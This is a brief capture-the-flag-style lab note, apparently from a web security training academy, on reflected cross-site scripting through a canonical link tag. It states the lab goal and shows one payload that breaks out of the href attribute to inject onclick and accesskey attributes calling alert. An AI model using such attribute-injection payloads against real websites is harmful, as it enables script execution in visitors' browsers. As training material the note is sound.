Lab #20 - Reflected XSS in canonical link tag

Target Goal - Perform an XSS attack  on the homepage that injects an attribute that calls the alert function.

Analysis:

<link rel="canonical" href='https://0a4c00fe0454d3bdc0c59a4a007a0072.web-security-academy.net/?randome=test'%09onclick='alert(1)'%09accesskey='x'/>
